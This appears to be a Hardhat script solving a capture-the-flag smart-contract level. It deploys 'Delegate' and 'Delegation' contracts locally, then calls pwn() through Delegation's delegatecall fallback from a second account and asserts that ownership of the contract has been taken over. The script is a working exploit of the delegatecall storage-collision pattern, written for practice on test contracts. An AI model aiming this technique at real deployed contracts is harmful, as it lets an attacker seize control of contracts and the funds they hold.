// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { expect } = require("chai");

async function main() {
    // Hardhat always runs the compile task when running scripts with its command
    // line interface.
    //
    // If this script is run directly using `node` you may want to call compile
    // manually to make sure everything is compiled
    // await hre.run('compile');

    // We get the contract to deploy

    const signers = await hre.ethers.getSigners();
    Delegate = await hre.ethers.getContractFactory("Delegate");
    const dl = await Delegate.deploy(signers[0].address);
    await dl.deployed();



    Delegation = await hre.ethers.getContractFactory("Delegation");
    const dlt = await Delegation.deploy(dl.address);
    await dlt.deployed();
    expect(await dlt.owner()).to.equal(signers[0].address);

    const target = Delegate.attach(dlt.address).connect(signers[1]);
    const pwnTx = await target.pwn();
    await pwnTx.wait();

    expect(await dlt.owner()).to.equal(signers[1].address);
}


// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
